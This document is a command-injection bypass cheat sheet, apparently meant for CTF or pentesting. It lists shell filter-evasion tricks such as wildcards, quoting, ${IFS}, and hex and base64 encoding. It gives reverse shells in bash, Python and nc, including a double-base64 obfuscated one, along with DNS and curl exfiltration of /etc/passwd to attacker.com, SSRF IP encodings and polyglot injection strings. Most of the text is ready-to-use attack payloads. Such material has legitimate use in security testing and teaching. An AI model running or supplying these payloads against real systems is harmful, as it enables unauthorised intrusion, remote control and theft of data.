# 1. Bypass forbidden Command

## A. Character Evasion

```yaml
# Question marks (wildcards)
/usr/bin/who?mi      # whoami
/usr/bin/p?ng        # ping
/bin/c?t /etc/pass?d # cat /etc/passwd

# Asterisks (wildcards)
/usr/bin/who*mi      # whoami
/bin/l* -la          # ls -la
/usr/bin/nm*p -p 80   # nmap -p 80

# Brackets (character sets)
/usr/bin/n[c]        # nc
/usr/bin/who[a]mi    # whoami
```


## B. Quotes & Backslashes

```yaml
# Quotes
'w'h'o'a'm'i         # whoami
"c"a"t" /etc/passwd  # cat /etc/passwd
ech''o hello         # echo hello
ech""o world         # echo world

# Backslashes
\u\n\a\m\e           # uname
/\b\i\n/////s\h      # /bin/sh
p\i\n\g              # ping
```

## ## **C. Variables & Expansions**

```bash
# Undefined variables ($u = null)
cat$u/etc/passwd$u   # cat /etc/passwd
p${u}i${u}n${u}g     # ping
w`u`h`u`o`u`a`u`m`u`i # whoami (creates errors but works)

# $@ expansion
who$@ami             # whoami
cat$@/etc/passwd     # cat /etc/passwd

# History expansion
!-1                  # Last command
!-2                  # Second last command
whoa                 # Error
mi                   # Error  
!-1!-2               # whoami (combines errors)
```

# 2. Bypass Space Restrictions

## A. IFS (Internal Field Separator)

```bash
cat${IFS}/etc/passwd      # cat /etc/passwd
echo${IFS}hello           # echo hello
ls${IFS}-la               # ls -la

# Set IFS to different character
IFS=,;`cat<<<cat,/etc/passwd`  # Using comma as separator
IFS=];b=cat]/etc/passwd;$b     # Using ] as separator
```

## B. Brace Expansion

```yaml
{cat,/etc/passwd}         # cat /etc/passwd
{echo,hello,world}        # echo hello world
{ls,-la}                  # ls -la
{whoami}                  # whoami
```

## C. Tabs & Hex

```bash
# Tab character (\x09)
ls\x09-la                # ls -la
cat\x09/etc/passwd       # cat /etc/passwd

# Hex representation
X=$'cat\x20/etc/passwd' && $X  # cat /etc/passwd
echo$'\x20'test                # echo test
```

## D. Variable Assignment

```bash
# Command in variable, then execute
a=wget;b=10.10.14.21:53/lol;$a$b
c=cat;d=/etc/passwd;$c$d
```

# 3. bypass Slash (/) Restrictions

## A. Variable Substitution

```bash
# Using $HOME
cat ${HOME:0:1}etc${HOME:0:1}passwd  # cat /etc/passwd (${HOME:0:1} = /)

# Using tr command
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
# tr '!-0' '"-1' converts . to /
```

## B. Hex/Octal Encoding

```bash
# Hex encoding
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`  # /etc/passwd
cat `xxd -r -p <<< 2f6574632f706173737764`                     # /etc/passwd

# Octal encoding
cat $(printf "\057\145\164\143\057\160\141\163\163\167\144")   # /etc/passwd
```

## C. Base64

```bash
# Base64 encode command
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh  # cat /etc/passwd
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)    # cat /etc/passwd

# Double base64 (bypasses + character issues)
echo $(echo 'cat /etc/passwd' | base64 | base64) | base64 -d | base64 -d | sh
```

## 4. Reverse Shell Bypasses
###  A. Standard Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/10.10.14.8/4444 0>&1

# Short version
(sh)0>/dev/tcp/10.10.10.10/443
exec >&0  # Then execute this inside reverse shell

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Without /bin/bash
/bin/sh -i >& /dev/tcp/10.10.14.8/4444 0>&1
```

## B. Character-Limited Reverse Shells

```bash
# Using only 5 characters (from Orange Tsai challenge)
# Step-by-step file creation
>ls\           # Creates file "ls\"
>sl            # Creates file "sl"
>g\>           # Creates file "g>"
>ht-           # Creates file "ht-"
*>v            # Creates file "v" with content "ls -th >g"
# ... continue building command

# 4 character version
'>dir'         # Creates files for building command
'>sl'
'>g\>'
'>ht-'
'*>v'
```

# 5. IP Address Bypasses
### A. Decimal conversion

```bash
# Convert IP to decimal
127.0.0.1 = 2130706433
# Usage:
curl http://2130706433  # = curl http://127.0.0.1

# Octal
017700000001 = 127.0.0.1

# Hex
0x7f000001 = 127.0.0.1
```

## B. Alternative Representations

```bash
# IPv6
[::1] = localhost
[::ffff:127.0.0.1] = 127.0.0.1

# Variations
127.1          # = 127.0.0.1
127.0.1        # = 127.0.0.1
127.0.0.0      # = 127.0.0.1 (sometimes)
```

# 6. Data Exfiltration Techniques

## A. Time-Based (Blind)

```bash
# Check first character of whoami
time if [ $(whoami|cut -c 1) == "r" ]; then sleep 5; fi
# If root, sleeps 5 seconds

# Binary search character by character
time if [ $(cat /etc/passwd|grep root|cut -c 1) == "r" ]; then sleep 2; fi
```

## B. DNS Exfiltration

```bash
# Using ping
ping -c 1 $(cat /etc/passwd|base64|cut -c1-63).attacker.com
# Data appears in DNS queries

# Using curl with subdomain
curl http://$(cat flag.txt|base64).attacker.com
```

## C. Environment Variables

```bash
# Extract characters from env variables
echo ${PATH:0:1}        # First character of PATH (usually "/")
echo ${LS_COLORS:10:1}  # Specific character from LS_COLORS
echo ${PWD}             # Current directory
```

## 7. Builtin & Restricted Shell bypasses

## A. Shell Builtins Only

```bash
# List available builtins
enable                 # Show all builtins
declare -F             # List function names

# Set PATH if unset
PATH="/bin" /bin/ls    # Temporary PATH
export PATH="/bin"     # Set PATH
declare PATH="/bin"    # Alternative method

# Read files without cat
while read -r line; do echo $line; done < /etc/passwd

# Execute commands from input
read cmd; exec $cmd    # Wait for input, then execute
read cmd; eval $cmd    # Alternative
```

## B. Getting "/" Character

```bash
# From PWD
printf %.1s "$PWD"     # First character of PWD (usually "/")
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls  # /bin/ls

# From other sources
declare                # Check all variables for "/"
echo $HOME             # Usually contains "/"
```

## 8. Polyglot Payloads

## A. Multi-Context Injection

```bash
# Works in multiple contexts (bash, sh, etc.)
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Complex polyglot
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

## B. Regex Bypass with Newlines

```bash
# Bypass "letters/numbers only" regex
1%0a`curl http://attacker.com`  # Newline character
1\ncurl attacker.com            # Literal newline
```

# 9. Advanced Techniques

### A. Bash NOP Sled (Bashsledding)

```bash
# Leading spaces are ignored by bash
"                nc -e /bin/sh 10.0.0.1 4444"
# 16 spaces act as NOP sled

# Use in memory corruption exploits
payload="                /bin/sh"
# Execution starts anywhere in spaces
```

## B. Read-only/Noexec Bypass

```bash
# Use interpreters already in memory
python -c 'import os; os.system("/bin/sh")'
perl -e 'exec "/bin/sh"'

# Use /proc if available
cat /proc/self/cmdline    # Read process info
cat /proc/self/environ    # Read environment
```

## C. Symobilic Link Tricks

```bash
# Create symlink to read restricted files
ln -s /flag.txt ./link    # Create symlink
cat link                  # Read through symlink

# Hard links
ln /f* .                  # Creates hard link to /flag.txt in current dir
```

# 10. Automation & Tools

## A. Bashfuscator

Github: https://github.com/Bashfuscator/Bashfuscator

```bash
# Obfuscate commands
./bashfuscator -c 'cat /etc/passwd'
# Outputs heavily obfuscated version
```

## B. Quick Test Payloads

```bash
# Test for command injection
$(sleep 5)      # Time-based test
`sleep 5`       # Backtick version
;sleep 5        # Semicolon
|sleep 5        # Pipe
&&sleep 5       # AND
||sleep 5       # OR

# Test with different separators
cat /etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat$@/etc/passwd
```

# 11. Quick Reference - One Liners

#### Most Reliable Bypasses

```bash
# Space bypass
cat${IFS}/etc/passwd

# Command bypass
/usr/bin/who?mi
'w'h'o'a'm'i'

# Slash bypass  
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Reverse shell (obfuscated)
echo$(echo${IFS}"bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.8/4444${IFS}0>&1"|base64|base64)|ba''se''6''4${IFS}-''d|ba''se64${IFS}-''d|b''a''s''h
```

### Detection Tests:

```bash
# Quick check
; echo vulnerable
`echo vulnerable`
$(echo vulnerable)
| echo vulnerable
|| echo vulnerable
&& echo vulnerable
```

## Critical Techniques Priority

1. **IFS for spaces** → ${IFS} works almost everywhere
2. **Wildcards for commands** → who?mi, p?ng
3. **Variable tricks** → $@, $u, ${parameter}
4. **Base64 encoding** → bypasses character filters
5. **Decimal IPs** → bypass IP filters
6. **Time-based exfiltration** → blind command injection
7. **Builtin abuse** → when external commands blocked
8. **Polyglot payloads** → work in multiple contexts
9. **DNS exfiltration** → bypass network filters
10. **NOP sleds** → for memory corruption exploits